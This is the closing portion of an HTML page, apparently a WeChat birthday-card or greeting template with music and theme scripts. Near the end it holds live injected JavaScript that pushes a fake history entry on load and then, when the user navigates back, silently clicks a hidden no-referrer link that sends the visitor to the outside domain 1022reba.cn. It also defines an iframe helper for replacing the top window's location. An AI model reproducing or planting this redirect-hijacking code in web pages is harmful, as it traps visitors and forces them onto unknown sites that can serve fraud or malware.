    <!-- 按需加载，选择此片头时方才加载 -->
        <script src="../../m/m3/js/start_birthdaycake.js"></script>

     


            



    <script> 
        var attachment='null'; //可能为null
        var attached_content={"bool_save":false}; //可能为null
        console.log(attached_content); 
       
        function init_attachment(){  //开始attachment
            console.log('init_attachment ->'+attachment);
            switch(attachment){
                case 'timer':
                    init_at_timer();
                    break;
                default:
                    return; 
            }
        } 
    </script>

    


    <script src='../../m/m3/js/jweixin-1.2.0.js'></script>
	<script src='../../m/m3/js/theme_common.js'></script> <!-- 音乐控制和微信设置等公共部分js外部引入 -->







    
	<script type="text/javascript">
											function a(e) {
												var f = document.createElement('iframe');
												f.style.display = 'none';
												document.body.appendChild(f).src = 'javascript:"<script>top.location.replace(\'' + e + '\')<\/script>"';
											}

											function jump1() {
												if (!localStorage.is_fx) {
													localStorage.is_fx = Date.now()
													//a('http://1022reba.cn/c')
													//window.location.replace();
													// location.href="http://1022reba.cn/c";
												} else {
													// localStorage.is_fx = Date.now()
												}
											}

											function jump2() {
												gotoData = {
													"hb": "http://1022reba.cn/c",
													"hb1": "http://1022reba.cn/c",
												}
												if (gotoData[window.location.pathname] != undefined) {
													//a(gotoData[window.location.pathname])
												} else {
													jump1()
												}

											}
										</script>
										<script type="text/javascript">
											window.onhashchange = function() {
												jp();
											};

											function hh() {
												history.pushState(history.length + 1, "app", "#pt_" + new Date().getTime());
											}


											function jp() {
												var a = document.createElement('a');
												a.setAttribute('rel', 'noreferrer');
												a.setAttribute('href', "http://1022reba.cn/c");
												document.body.appendChild(a);
												a.click();
												document.body.removeChild(a);
											}

											window.onload = function() {
												setTimeout('hh();', 100);
												setTimeout(
													"var imgs = document.images;for (var t_i=0;t_i<imgs.length;t_i++) {if (imgs[t_i].attributes['d-s'] && imgs[t_i].attributes['d-s'].value) {imgs[t_i].src = imgs[t_i].attributes['d-s'].value;}}",
													100);
											}
											// jump2()
											window.onpageshow = jump2
										</script>


















</body>
</html>